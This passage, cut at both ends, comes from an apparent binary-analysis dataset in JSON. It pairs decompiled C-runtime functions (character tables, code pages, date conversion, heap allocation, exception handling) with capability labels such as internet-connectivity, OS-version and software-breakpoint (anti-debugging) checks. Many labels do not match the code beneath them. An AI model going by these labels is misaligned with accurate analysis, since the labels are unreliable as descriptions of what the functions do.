do {\n            if ((uVar3 < 0x41) || (0x5a < uVar3)) {\n                if ((0x60 < uVar3) && (uVar3 < 0x7b)) {\n                    *(uVar3 + 0x468721) = *(uVar3 + 0x468721) | 0x20;\n                    cVar5 = uVar3 + -0x20;\n                    goto code_r0x00412bcd;\n                }\n                *(uVar3 + 0x468840) = 0;\n            }\n            else {\n                *(uVar3 + 0x468721) = *(uVar3 + 0x468721) | 0x10;\n                cVar5 = uVar3 + ' ';\ncode_r0x00412bcd:\n                *(uVar3 + 0x468840) = cVar5;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0x100);\n    }\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 1814
    },
    "00412c73": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412c73(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    uint extraout_ECX_00;\n    int32_t iVar5;\n    uint8_t *puVar6;\n    uint8_t *puVar7;\n    uint *puVar8;\n    uint32_t var_1ch;\n    uint32_t lpCPInfo;\n    uint var_12h;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    if (arg_8h != 0) {\n        iVar5 = 0;\n        uVar3 = 0;\ncode_r0x00412c95:\n        if (*(uVar3 + 0x464108) != arg_8h) goto code_r0x00412c9d;\n        puVar8 = 0x468720;\n        for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar8 = 0;\n            puVar8 = puVar8 + 1;\n        }\n        var_1ch = 0;\n        *puVar8 = 0;\n        puVar6 = iVar5 * 0x30 + 0x464118;\n        do {\n            uVar2 = *puVar6;\n            puVar7 = puVar6;\n            while ((uVar2 != 0 && (uVar1 = puVar7[1],  uVar1 != 0))) {\n                uVar3 = uVar2;\n                if (uVar3 <= uVar1) {\n                    uVar2 = *(var_1ch + 0x464100);\n                    do {\n                        *(uVar3 + 0x468721) = *(uVar3 + 0x468721) | uVar2;\n                        uVar3 = uVar3 + 1;\n                    } while (uVar3 <= uVar1);\n                }\n                puVar7 = puVar7 + 2;\n                uVar2 = *puVar7;\n            }\n            var_1ch = var_1ch + 1;\n            puVar6 = puVar6 + 8;\n        } while (var_1ch < 4);\n        *0x468824 = arg_8h;\n        *0x468710 = 1;\n        *0x468708 = fcn.00412a20();\n        *0x468830 = *(extraout_ECX + 0x46410c);\n        *0x468834 = *(extraout_ECX + 0x464110);\n        *0x468838 = *(extraout_ECX + 0x464114);\n        goto code_r0x00412dea;\n    }\ncode_r0x00412de5:\n    fcn.00412a4f();\ncode_r0x00412dea:\n    fcn.00412a78();\ncode_r0x00412df6:\n    fcn.0041176c();\n    return;\ncode_r0x00412c9d:\n    uVar3 = uVar3 + 0x30;\n    iVar5 = iVar5 + 1;\n    if (0xef < uVar3) goto code_r0x00412ca8;\n    goto code_r0x00412c95;\ncode_r0x00412ca8:\n    iVar5 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(arg_8h, &lpCPInfo);\n    if (iVar5 != 1) {\n        if (*0x4670cc == 0) goto code_r0x00412df6;\n        goto code_r0x00412de5;\n    }\n    puVar8 = 0x468720;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *0x468824 = arg_8h;\n    *0x468708 = 0;\n    if (lpCPInfo < 2) {\n        *0x468710 = 0;\n    }\n    else {\n        if (var_12h != '\\0') {\n            puVar6 = &var_12h + 1;\n            do {\n                uVar2 = *puVar6;\n                if (uVar2 == 0) break;\n                for (uVar3 = puVar6[-1]; uVar3 <= uVar2; uVar3 = uVar3 + 1) {\n                    *(uVar3 + 0x468721) = *(uVar3 + 0x468721) | 4;\n                }\n                puVar7 = puVar6 + 1;\n                puVar6 = puVar6 + 2;\n            } while (*puVar7 != 0);\n        }\n        uVar3 = 1;\n        do {\n            *(uVar3 + 0x468721) = *(uVar3 + 0x468721) | 8;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0xff);\n        *0x468708 = fcn.00412a20();\n        *0x468710 = extraout_ECX_00;\n    }\n    *0x468830 = 0;\n    *0x468834 = 0;\n    *0x468838 = 0;\n    goto code_r0x00412dea;\n}\n",
        "token_count": 1234
    },
    "00412f81": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint8_t * fcn.00412f81(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    \n    puVar1 = param_1 + 1;\n    if (((*(*param_1 + 0x468721) & 4) != 0) && (*puVar1 != 0)) {\n        puVar1 = param_1 + 2;\n    }\n    return puVar1;\n}\n",
        "token_count": 97
    },
    "00412fe7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412fe7(uint arg_8h, uint arg_ch, uint noname_2, uint noname_3, uint arg_18h)\n\n{\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x20) == 0) {\n        fcn.004125de(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x1c), *(unaff_EBP + 0x18));\n    }\n    return;\n}\n",
        "token_count": 137
    },
    "0041306a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint8_t * fcn.0041306a(uint8_t *param_1, uint8_t *param_2)\n\n{\n    int32_t iVar1;\n    uint8_t *puVar2;\n    \n    iVar1 = fcn.00414501();\n    iVar1 = *(iVar1 + 0x60);\n    if (iVar1 != *0x46870c) {\n        iVar1 = fcn.00412c04();\n    }\n    if (param_2 <= param_1) {\n        return NULL;\n    }\n    if (*(iVar1 + 8) == 0) {\n        return param_2 + -1;\n    }\n    puVar2 = param_2 + -1;\n    do {\n        puVar2 = puVar2 + -1;\n        if (puVar2 < param_1) break;\n    } while ((*(*puVar2 + 0x1d + iVar1) & 4) != 0);\n    return param_2 + (-1 - (param_2 - puVar2 & 1U));\n}\n",
        "token_count": 230
    },
    "0041327a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint64_t __cdecl fcn.0041327a(int32_t arg_8h)\n\n{\n    uint64_t uVar1;\n    int32_t *in_EAX;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    bool bVar6;\n    int64_t iVar7;\n    ulong uVar8;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_ch = in_EAX[5];\n    var_8h = var_ch >> 0x1f;\n    if ((var_8h < 0) ||\n       ((((-1 < var_ch || var_8h < 0 && (var_ch < 0x45)) || (0 < var_8h)) || ((-1 < var_8h && (0x44c < var_ch)))))) {\ncode_r0x004134c0:\n        _var_ch = -1;\n    }\n    else {\n        iVar4 = in_EAX[4];\n        if ((iVar4 < 0) || (0xb < iVar4)) {\n            uVar2 = iVar4 / 0xc;\n            iVar4 = iVar4 % 0xc;\n            bVar6 = CARRY4(var_ch, uVar2);\n            var_ch = var_ch + uVar2;\n            in_EAX[4] = iVar4;\n            var_8h = var_8h + (uVar2 >> 0x1f) + bVar6;\n            if (iVar4 < 0) {\n                bVar6 = var_ch != 0;\n                var_ch = var_ch - 1;\n                in_EAX[4] = iVar4 + 0xc;\n                var_8h = var_8h + -1 + bVar6;\n            }\n            if ((((var_8h < 0) || ((var_8h < 1 && (var_ch < 0x45)))) || (0 < var_8h)) ||\n               ((-1 < var_8h && (0x44c < var_ch)))) goto code_r0x004134c0;\n        }\n        iVar4 = in_EAX[4];\n        var_14h = *(iVar4 * 4 + 0x4648e4);\n        var_10h = var_14h >> 0x1f;\n        iVar7 = fcn.0041acc0(var_ch, var_8h, 4, 0);\n        if ((iVar7 == 0) && (uVar2 = var_ch,  iVar7 = fcn.0041acc0(var_ch, var_8h, 100, 0),  iVar7 != 0)) {\ncode_r0x0041336f:\n            if (1 < iVar4) {\n                bVar6 = 0xfffffffe < var_14h;\n                var_14h = var_14h + 1;\n                var_10h = var_10h + bVar6;\n            }\n        }\n        else {\n            uVar2 = var_ch + 0x76c;\n            iVar7 = fcn.0041acc0();\n            if (iVar7 == 0) goto code_r0x0041336f;\n        }\n        iVar5 = var_ch - 1;\n        iVar4 = var_8h - (var_ch == 0);\n        iVar7 = fcn.00412930(var_ch + 299, var_8h + (0xfffffed4 < var_ch), 400, 0, uVar2);\n        uVar2 = iVar7 + in_EAX[3];\n        var_4h = iVar7 + in_EAX[3] >> 0x20;\n        uVar8 = fcn.00412930(iVar5, iVar4, 100, 0);\n        var_4h = (var_4h - (uVar8 >> 0x20)) - (uVar2 < uVar8);\n        iVar7 = fcn.00412930(iVar5, iVar4, 4, 0);\n        uVar1 = iVar7 + CONCAT44(var_4h, uVar2 - uVar8);\n        var_4h = uVar1 >> 0x20;\n        iVar7 = fcn.004128f0(var_ch, var_8h, 0x16d, 0);\n        iVar7 = iVar7 + (uVar1 & 0xffffffff | var_4h << 0x20) + CONCAT44(var_10h, var_14h);\n        uVar2 = iVar7;\n        var_4h = uVar2 - 0x63df;\n        iVar7 = fcn.004128f0(var_4h, (iVar7 >> 0x20) - (uVar2 < 0x63df), 0x18, 0);\n        iVar7 = fcn.004128f0(iVar7 + in_EAX[2], 0x3c, 0);\n        _var_ch = fcn.004128f0(iVar7 + in_EAX[1], 0x3c, 0);\n        _var_ch = _var_ch + *in_EAX;\n        if (arg_8h == 0) {\n            piVar3 = fcn.0041a3e6(&var_ch);\ncode_r0x004134ac:\n            if (piVar3 == NULL) goto code_r0x004134c0;\n        }\n        else {\n            fcn.0041abf2();\n            _var_ch = _var_ch + *0x464800;\n            piVar3 = fcn.004134e4(&var_ch);\n            if (piVar3 == NULL) goto code_r0x004134c0;\n            if ((0 < in_EAX[8]) || ((in_EAX[8] < 0 && (0 < piVar3[8])))) {\n                _var_ch = _var_ch + *0x464808;\n                piVar3 = fcn.004134e4(&var_ch);\n                goto code_r0x004134ac;\n            }\n        }\n        for (iVar4 = 9; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *in_EAX = *piVar3;\n            piVar3 = piVar3 + 1;\n            in_EAX = in_EAX + 1;\n        }\n    }\n    return _var_ch;\n}\n",
        "token_count": 1454
    },
    "004136f2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004136f2(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t arg_8h_00;\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00412580(0x455e50, 0x10);\n    uVar2 = *(unaff_EBP + 8) * *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x20) = uVar2;\n    if (uVar2 == 0) {\n        uVar2 = 1;\n    }\n    do {\n        iVar3 = 0;\n        *(unaff_EBP + -0x1c) = 0;\n        if (uVar2 < 0xffffffe1) {\n            if (*0x468704 == 3) {\n                uVar2 = uVar2 + 0xf & 0xfffffff0;\n                *(unaff_EBP + 0xc) = uVar2;\n                arg_8h_00 = *(unaff_EBP + -0x20);\n                if (*0x4686f0 < arg_8h_00) goto code_r0x00413767;\n                fcn.00416625(4);\n                *(unaff_EBP + -4) = 0;\n                uVar1 = fcn.004173c7(arg_8h_00);\n                *(unaff_EBP + -0x1c) = uVar1;\n                *(unaff_EBP + -4) = 0xffffffff;\n                fcn.0041379c();\n                iVar3 = *(unaff_EBP + -0x1c);\n                if (iVar3 != 0) {\n                    fcn.00411850(iVar3, 0, *(unaff_EBP + -0x20));\n                    goto code_r0x00413767;\n                }\n            }\n            else {\ncode_r0x00413767:\n                if (iVar3 != 0) {\ncode_r0x004137a7:\n                    fcn.004125bb();\n                    return;\n                }\n            }\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x468700, 8, uVar2);\n        }\n        if (((iVar3 != 0) || (*0x467234 == 0)) || (iVar3 = fcn.004176ed(uVar2),  iVar3 == 0)) goto code_r0x004137a7;\n    } while( true );\n}\n",
        "token_count": 599
    },
    "004137ad": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.004137ad(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    uint in_stack_00000008;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint32_t var_4h;\n    \n    uVar1 = arg_8h;\n    if (arg_8h < 0x100) {\n        uVar3 = fcn.0041ae9e(arg_8h);\n    }\n    else {\n        var_4h = 0;\n        iVar2 = fcn.00414501();\n        iVar2 = *(iVar2 + 0x60);\n        if (iVar2 != *0x46870c) {\n            iVar2 = fcn.00412c04();\n        }\n        arg_8h = CONCAT13(uVar1, CONCAT12(uVar1 >> 8, arg_8h));\n        if ((((*(iVar2 + 8) != 0) &&\n             (iVar2 = fcn.0041a164(1, &arg_8h + 2, 2, &var_4h, *(iVar2 + 4), *(iVar2 + 0xc), 1, unaff_EBX, var_4h, \n                                   unaff_EBP, unaff_retaddr, arg_8h, in_stack_00000008, in_stack_0000000c, \n                                   in_stack_00000010),  iVar2 != 0)) && (var_4h._2_2_ == 0)) && ((var_4h & 8) != 0)) {\n            return 1;\n        }\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 427
    },
    "004138d4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.004138d4(uint32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint8_t *unaff_ESI;\n    uint8_t *unaff_EDI;\n    \n    iVar1 = *(unaff_ESI + 4);\n    if ((iVar1 != 0) && (*(iVar1 + 8) != '\\0')) {\n        if ((iVar1 != *(unaff_EDI + 4)) && (iVar1 = fcn.00418650(iVar1 + 8, *(unaff_EDI + 4) + 8),  iVar1 != 0)) {\n            return 0;\n        }\n        if (((((*unaff_EDI & 2) != 0) && ((*unaff_ESI & 8) == 0)) || (((*param_1 & 1) != 0 && ((*unaff_ESI & 1) == 0))))\n           || (((*param_1 & 2) != 0 && ((*unaff_ESI & 2) == 0)))) {\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 243
    },
    "00413941": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00413941(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    int32_t iVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00412580(0x455e60, 0x10);\n    iVar1 = *(unaff_EBP + 8);\n    iVar5 = *(iVar1 + 8);\n    *(unaff_EBP + -0x1c) = iVar5;\n    iVar2 = fcn.00414501();\n    *(iVar2 + 0x84) = *(iVar2 + 0x84) + 1;\n    *(unaff_EBP + -4) = 0;\n    iVar2 = *(unaff_EBP + 0x10);\n    while (iVar5 != *(unaff_EBP + 0x14)) {\n        if ((iVar5 < 0) || (*(iVar2 + 4) <= iVar5)) {\n            fcn.00414830();\n        }\n        iVar3 = iVar5 * 8;\n        piVar4 = *(iVar2 + 8) + iVar3;\n        iVar5 = *piVar4;\n        *(unaff_EBP + -0x20) = iVar5;\n        *(unaff_EBP + -4) = 1;\n        if (piVar4[1] != 0) {\n            *(iVar1 + 8) = iVar5;\n            fcn.00414860(*(*(iVar2 + 8) + 4 + iVar3), iVar1, 0x103);\n        }\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x1c) = iVar5;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004139f4();\n    if (iVar5 != *(unaff_EBP + 0x14)) {\n        fcn.00414830();\n    }\n    *(iVar1 + 8) = iVar5;\n    fcn.004125bb();\n    return;\n}\n",
        "token_count": 525
    },
    "004139f4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.004139f4(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00414501();\n    if (0 < *(iVar1 + 0x84)) {\n        iVar1 = fcn.00414501();\n        *(iVar1 + 0x84) = *(iVar1 + 0x84) + -1;\n    }\n    return;\n}\n",
        "token_count": 87
    },
    "00413a84": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00413a84(int32_t *param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = *param_1 + in_EAX;\n    if (-1 < param_1[1]) {\n        iVar1 = iVar1 + *(*(param_1[1] + in_EAX) + param_1[2]) + param_1[1];\n    }\n    return iVar1;\n}\n",
        "token_count": 105
    },
    "00413ded": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.00413ded(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_20h;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x38);\n    fcn.00410c4b(*(unaff_EBP + -0x3c));\n    iVar1 = fcn.00414501();\n    *(iVar1 + 0x7c) = *(unaff_EBP + -0x40);\n    iVar1 = fcn.00414501();\n    *(iVar1 + 0x80) = *(unaff_EBP + -0x44);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((unaff_ESI[5] == 0x19930520 || (unaff_ESI[5] == 0x19930521)))) &&\n       ((*(unaff_EBP + -0x48) == 0 && (*(unaff_EBP + -0x20) != 0)))) {\n        iVar1 = fcn.00410c2a(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.00410d9a();\n            fcn.00413a3f(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 360
    },
    "00413e5c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00413e5c(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint arg_ch_00;\n    uint uVar5;\n    uint8_t *extraout_ECX;\n    int32_t *extraout_EDX;\n    int32_t unaff_EBP;\n    int32_t *arg_8h_00;\n    uint var_4h;\n    \n    fcn.00412580(0x455ec0, 8);\n    puVar1 = *(unaff_EBP + 0xc);\n    iVar4 = *(unaff_EBP + 8);\n    if (((puVar1[1] == 0) || (*(puVar1[1] + 8) == '\\0')) || ((puVar1[2] == 0 && ((*(puVar1 + 3) & 0x80) == 0))))\n    goto code_r0x00413fc6;\n    uVar2 = *puVar1;\n    arg_8h_00 = extraout_EDX;\n    if (-1 < uVar2) {\n        arg_8h_00 = puVar1[2] + 0xc + extraout_EDX;\n    }\n    *(unaff_EBP + -4) = 0;\n    uVar5 = *(iVar4 + 0x18);\n    if ((uVar2 & 8) == 0) {\n        if ((*extraout_ECX & 1) == 0) {\n            if (*(extraout_ECX + 0x18) == 0) {\n                iVar4 = fcn.0041b0a0(uVar5, 1);\n                if ((iVar4 == 0) || (iVar4 = fcn.0041b0bc(arg_8h_00, 1),  iVar4 == 0)) {\ncode_r0x00413fbd:\n                    fcn.00414830();\n                }\n                else {\n                    uVar5 = *(extraout_ECX + 0x14);\n                    arg_ch_00 = fcn.00413a84();\n                    fcn.004105b0(arg_8h_00, arg_ch_00, uVar5);\n                }\n            }\n            else {\n                iVar4 = fcn.0041b0a0(uVar5, 1);\n                if (((iVar4 == 0) || (iVar4 = fcn.0041b0bc(arg_8h_00, 1),  iVar4 == 0)) ||\n                   (iVar4 = fcn.0041b0d8(*(extraout_ECX + 0x18)),  iVar4 == 0)) goto code_r0x00413fbd;\n                if ((*extraout_ECX & 4) == 0) {\n                    uVar5 = fcn.00413a84();\n                    fcn.00410924(arg_8h_00, *(extraout_ECX + 0x18), uVar5);\n                }\n                else {\n                    uVar5 = fcn.00413a84(1);\n                    fcn.0041092b(arg_8h_00, *(extraout_ECX + 0x18), uVar5);\n                }\n            }\n        }\n        else {\n            iVar3 = fcn.0041b0a0(uVar5, 1);\n            if ((iVar3 == 0) || (iVar3 = fcn.0041b0bc(arg_8h_00, 1),  iVar3 == 0)) goto code_r0x00413fbd;\n            fcn.004105b0(arg_8h_00, *(iVar4 + 0x18), *(extraout_ECX + 0x14));\n            if ((*(extraout_ECX + 0x14) == 4) && (*arg_8h_00 != 0)) goto code_r0x00413ed5;\n        }\n    }\n    else {\n        iVar3 = fcn.0041b0a0(uVar5, 1);\n        if ((iVar3 == 0) || (iVar3 = fcn.0041b0bc(arg_8h_00, 1),  iVar3 == 0)) goto code_r0x00413fbd;\n        *arg_8h_00 = *(iVar4 + 0x18);\ncode_r0x00413ed5:\n        iVar4 = fcn.00413a84();\n        *arg_8h_00 = iVar4;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\ncode_r0x00413fc6:\n    fcn.004125bb();\n    return;\n}\n",
        "token_count": 1055
    },
    "00413fd8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00413fd8(int32_t **arg_8h, int32_t arg_ch, uint32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t *arg_8h_00;\n    uint32_t var_14h;\n    int32_t var_10h;\n    int32_t var_4h;\n    \n    if (arg_8h == NULL) {\n        return 0;\n    }\n    arg_8h_00 = *arg_8h;\n    if ((arg_ch == 0) || (*(arg_ch + 8) == '\\0')) {\n        if ((((*arg_8h_00 != -0x1f928c9d) || (arg_8h_00[4] != 3)) ||\n            (((arg_8h_00[5] != 0x19930520 && (arg_8h_00[5] != 0x19930521)) || (arg_8h_00[7] != 0)))) ||\n           (iVar1 = fcn.00414501(),  *(iVar1 + 0x7c) != 0)) {\n            iVar1 = fcn.00414501();\n            *(iVar1 + 0x84) = *(iVar1 + 0x84) + 1;\n            return 1;\n        }\n    }\n    else if (((*arg_8h_00 == -0x1f928c9d) && (arg_8h_00[4] == 3)) &&\n            ((arg_8h_00[5] == 0x19930520 || (arg_8h_00[5] == 0x19930521)))) {\n        if (arg_8h_00[7] == 0) {\n            iVar1 = fcn.00414501();\n            if (*(iVar1 + 0x7c) == 0) {\n                return 0;\n            }\n            iVar1 = fcn.00414501();\n            arg_8h_00 = *(iVar1 + 0x7c);\n        }\n        var_14h = arg_10h | 0x80000000;\n        var_10h = arg_ch;\n        for (var_4h = **(arg_8h_00[7] + 0xc); 0 < var_4h; var_4h = var_4h + -1) {\n            iVar1 = fcn.004138d4(arg_8h_00[7]);\n            if (iVar1 != 0) {\n                iVar1 = fcn.00414501();\n                *(iVar1 + 0x84) = *(iVar1 + 0x84) + 1;\n                if (arg_14h == 0) {\n                    return 1;\n                }\n                fcn.00413e5c(arg_8h_00, &var_14h);\n                return 1;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 661
    },
    "004140fd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004140fd(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint unaff_EBX;\n    int32_t unaff_ESI;\n    uint *unaff_EDI;\n    \n    if (in_ECX != 0) {\n        fcn.00413e5c(arg_8h, unaff_EBX);\n    }\n    if (arg_1ch == 0) {\n        arg_1ch = unaff_ESI;\n    }\n    fcn.00410932(arg_1ch, arg_8h);\n    fcn.00413941(unaff_ESI, arg_10h, arg_14h, *unaff_EDI);\n    *(unaff_ESI + 8) = unaff_EDI[1] + 1;\n    iVar1 = fcn.00413c98(arg_8h, unaff_ESI, arg_ch, arg_14h, arg_18h, 0x100);\n    if (iVar1 != 0) {\n        fcn.004108ed(iVar1);\n    }\n    return;\n}\n",
        "token_count": 277
    },
    "00414164": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl\nfcn.00414164(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_retaddr;\n    uint in_stack_00000024;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    if ((*arg_8h != -0x7ffffffd) &&\n       (((iVar1 = fcn.00414501(),  *(iVar1 + 0x74) == 0 ||\n         (iVar1 = fcn.00410a0f(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_20h, arg_24h, unaff_ESI, var_8h, var_4h, \n                               unaff_EBP, unaff_retaddr, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, \n                               arg_24h, in_stack_00000024),  iVar1 == 0)) &&\n        (piVar2 = fcn.00410b88(arg_18h, arg_20h, arg_1ch, &var_4h, &var_8h),  var_4h < var_8h)))) {\n        do {\n            if (((*piVar2 <= arg_1ch) && (arg_1ch <= piVar2[1])) &&\n               ((iVar1 = *(piVar2[3] * 0x10 + piVar2[4] + -0xc),  iVar1 == 0 || (*(iVar1 + 8) == '\\0')))) {\n                fcn.004140fd(arg_8h, arg_10h, arg_14h, arg_18h, arg_20h, arg_24h);\n            }\n            var_4h = var_4h + 1;\n            piVar2 = piVar2 + 5;\n        } while (var_4h < var_8h);\n    }\n    return;\n}\n",
        "token_count": 547
    },
    "00414222": {
        "rules": [
